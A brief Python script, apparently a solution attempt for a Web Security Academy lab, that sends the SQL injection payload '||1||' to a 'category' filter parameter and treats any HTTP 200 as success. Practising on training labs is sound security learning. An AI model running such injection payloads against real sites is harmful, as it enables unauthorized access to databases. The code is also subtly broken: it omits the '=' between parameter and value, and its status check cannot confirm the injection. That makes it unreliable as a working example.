import requests

LINK = "https://0ace006e04222cee8253ac2700e600d7.web-security-academy.net"
FILTER_ROUTE = "/filter"
FILTER_OPTION = "category"
PAYLOAD = "'||1||'"

res = requests.get(LINK + FILTER_ROUTE + "?" + FILTER_OPTION + PAYLOAD)


if res.status_code == 200:
    print("Everything is okay :)")
else:
    print("Maybe appear syntax problem")
